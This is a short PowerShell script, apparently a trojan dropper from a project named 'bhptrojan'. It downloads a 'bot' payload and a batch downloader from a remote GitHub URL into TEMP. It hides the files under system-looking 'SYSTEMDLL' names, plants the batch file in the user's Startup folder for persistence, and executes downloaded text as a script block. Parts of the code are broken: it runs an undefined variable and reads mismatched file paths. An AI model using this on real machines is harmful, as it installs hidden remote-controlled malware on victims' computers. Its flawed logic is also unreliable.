$path = $env:TEMP;
$userprof = $env:USERPROFILE;
$startUpFolder = "$userprof\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";
$trus = test-path $path\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.log;

if($trus -eq "true"){
    $bot = Get-Content $path\=SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.log -Raw

    $ScriptBlock = [System.Management.Automation.ScriptBlock]::Create($AnyFile)

    & $ScriptBlock
}
else{
    invoke-webrequest -uri https://raw.githubusercontent.com/cyruschiira/bhptrojan/main/bot -outfile $path\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.log
    invoke-webrequest -uri https://raw.githubusercontent.com/cyruschiira/bhptrojan/main/downloader -outfile $startUpFolder\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.bat

    $backup = Get-Content $path\anyfile.log -Raw

    $backupscript = [System.Management.Automation.ScriptBlock]::Create($backup)

    & $backupscript
}
